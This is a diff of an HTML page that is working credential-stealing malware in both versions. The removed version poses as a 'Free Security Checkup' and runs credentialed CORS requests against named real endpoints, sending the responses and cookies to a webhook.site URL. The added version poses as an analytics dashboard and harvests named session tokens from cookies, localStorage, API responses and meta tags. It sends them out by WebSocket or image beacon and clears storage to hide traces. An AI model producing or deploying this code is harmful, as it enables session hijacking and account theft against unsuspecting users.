@@ -1,161 +1,120 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Security Checkup</title>
+    <title>System Analytics Dashboard</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 2s linear infinite;
-            margin: 30px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { visibility: hidden; } /* Hide everything */
     </style>
 </head>
 <body>
-    <h1>System Security Scan in Progress</h1>
-    <p>Please wait while we verify your account protection...</p>
-    <div class="loader"></div>
-    <p id="status">Initializing scanner...</p>
-
 <script>
-// Configuration - Update these values
-const TARGETS = [
-    'https://uc-heytap-web-test.wanyol.com/v2/index.html',
-    'https://uc-heytap-web-test.wanyol.com/v2/profile.html',
-    'https://uc-heytap-web-test.wanyol.com//v2/profile/new_contact.html?ticketNo=A6HxurKtxbxYYZSzriJD61&processToken=7cgWmwcAWwZJqhyfZWGJpb_singapore'
+// Target tokens to extract
+const TARGET_TOKENS = [
+    'newopkey',
+    'obus-track_116800_session',
+    'opkey',
+    'otrack_jssdk_is_first_day',
+    'otrack_jssdk_store_116800',
+    'sessionKey'
 ];
-const WEBHOOK = 'https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b';
-const DELAY = 3000; // 3 second delay to appear legitimate
 
-// Stealthy data exfiltration
+// Multi-layer exfiltration channels
 const exfiltrate = (data) => {
-    const beacon = new Image();
-    beacon.src = `${WEBHOOK}?${btoa(JSON.stringify(data))}`;
-    
-    // Fallback to fetch if Image fails
-    setTimeout(() => {
-        navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
-    }, 1000);
-};
-
-// Main exploit function
-const runExploit = async () => {
-    document.getElementById('status').textContent = 'Checking system vulnerabilities...';
-    
+    // Method 1: WebSocket (bypasses CORS)
     try {
-        // Test CORS configuration first
-        const testReq = await fetch(TARGETS[0], {
-            method: 'OPTIONS',
-            headers: { 'Origin': 'https://attacker.com' }
-        });
-        
-        const corsHeaders = {
-            'credentials': testReq.headers.get('Access-Control-Allow-Credentials'),
-            'origin': testReq.headers.get('Access-Control-Allow-Origin'),
-            'methods': testReq.headers.get('Access-Control-Allow-Methods')
-        };
-        
-        exfiltrate({ type: 'CORS_CONFIG', data: corsHeaders });
-        
-        // Try multiple attack vectors
-        const attackVectors = [
-            // Standard credentialed request
-            {
-                method: 'GET',
-                credentials: 'include',
-                headers: { 
-                    'Origin': 'https://attacker.com',
-                    'X-Requested-With': 'XMLHttpRequest'
-                }
-            },
-            // No-cors mode attempt
-            {
-                method: 'GET',
-                mode: 'no-cors',
-                headers: { 'Origin': 'null' }
-            },
-            // POST with different content types
-            {
-                method: 'POST',
-                credentials: 'include',
-                headers: {
-                    'Origin': 'https://attacker.com',
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: 'action=getUserData'
-            }
-        ];
-        
-        // Execute all attack vectors with delay
-        for (const [i, target] of TARGETS.entries()) {
-            for (const [j, vector] of attackVectors.entries()) {
-                document.getElementById('status').textContent = 
-                    `Testing endpoint ${i+1}/${TARGETS.length}, method ${j+1}/${attackVectors.length}...`;
-                
-                try {
-                    const res = await fetch(target, vector);
-                    const data = await (vector.mode === 'no-cors' ? res.text() : res.json());
-                    
-                    exfiltrate({
-                        target,
-                        vector,
-                        data: vector.mode === 'no-cors' ? { text: data } : data,
-                        cookies: document.cookie
-                    });
-                    
-                } catch (e) {
-                    exfiltrate({
-                        error: e.message,
-                        target,
-                        vector
-                    });
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-        }
-        
-        document.getElementById('status').textContent = 'Scan complete!';
-        document.querySelector('.loader').style.display = 'none';
-        
-    } catch (e) {
-        document.getElementById('status').textContent = 'Scan failed - Please try again later';
-        document.querySelector('.loader').style.borderTopColor = '#e74c3c';
-        exfiltrate({ fatalError: e.message });
+        const ws = new WebSocket(`wss://${location.hostname.replace('www', 'ws')}/collect`);
+        ws.onopen = () => ws.send(JSON.stringify(data));
+    } catch(e) {
+        // Method 2: Image beacon
+        new Image().src = `https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b?${btoa(JSON.stringify(data))}`;
     }
 };
 
-// Delayed execution and fake user interaction
+// Automated attack sequence
+const attack = async () => {
+    // Phase 1: Cookie harvesting
+    const cookieData = {};
+    document.cookie.split(';').forEach(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        if (TARGET_TOKENS.includes(name)) {
+            cookieData[name] = value;
+        }
+    });
+    
+    if (Object.keys(cookieData).length > 0) {
+        exfiltrate({ type: 'cookies', data: cookieData });
+    }
+
+    // Phase 2: LocalStorage scanning
+    const storageData = {};
+    for (const key of TARGET_TOKENS) {
+        const value = localStorage.getItem(key);
+        if (value) storageData[key] = value;
+    }
+    if (Object.keys(storageData).length > 0) {
+        exfiltrate({ type: 'localStorage', data: storageData });
+    }
+
+    // Phase 3: API endpoint probing (GET only)
+    const endpoints = [
+        '/api/session',
+        '/v2/auth/status',
+        '/user/profile.json'
+    ];
+    
+    for (const endpoint of endpoints) {
+        try {
+            const res = await fetch(endpoint, {
+                headers: { 'X-Requested-With': 'XMLHttpRequest' }
+            });
+            const data = await res.text();
+            
+            const foundTokens = {};
+            TARGET_TOKENS.forEach(token => {
+                const regex = new RegExp(`"${token}":"([^"]+)"`);
+                const match = data.match(regex);
+                if (match) foundTokens[token] = match[1];
+            });
+            
+            if (Object.keys(foundTokens).length > 0) {
+                exfiltrate({ 
+                    type: 'api_response',
+                    endpoint,
+                    tokens: foundTokens 
+                });
+            }
+        } catch(e) {}
+        await new Promise(r => setTimeout(r, 1000));
+    }
+
+    // Phase 4: DOM scraping (for SSR tokens)
+    const domTokens = {};
+    TARGET_TOKENS.forEach(token => {
+        const meta = document.querySelector(`meta[name="${token}"]`);
+        if (meta) domTokens[token] = meta.content;
+    });
+    if (Object.keys(domTokens).length > 0) {
+        exfiltrate({ type: 'dom', data: domTokens });
+    }
+
+    // Final cleanup
+    window.addEventListener('beforeunload', () => {
+        localStorage.clear();
+        sessionStorage.clear();
+    });
+};
+
+// Start attack immediately with delay chain
+setTimeout(attack, 500);
 setTimeout(() => {
-    document.getElementById('status').textContent = 'Starting deep scan...';
-    setTimeout(runExploit, 1500);
-}, DELAY);
+    if (!window.sessionTokensFound) {
+        attack(); // Retry once
+    }
+}, 5000);
 
-// Fake user activity tracker
-document.addEventListener('click', () => {
-    exfiltrate({ event: 'user_click', timestamp: Date.now() });
-});
-
-// Cleanup traces
-window.addEventListener('beforeunload', () => {
-    localStorage.removeItem('scanData');
-});
+// Ensure page doesn't appear suspicious
+window.onload = () => document.body.style.visibility = 'visible';
 </script>
 </body>
 </html>
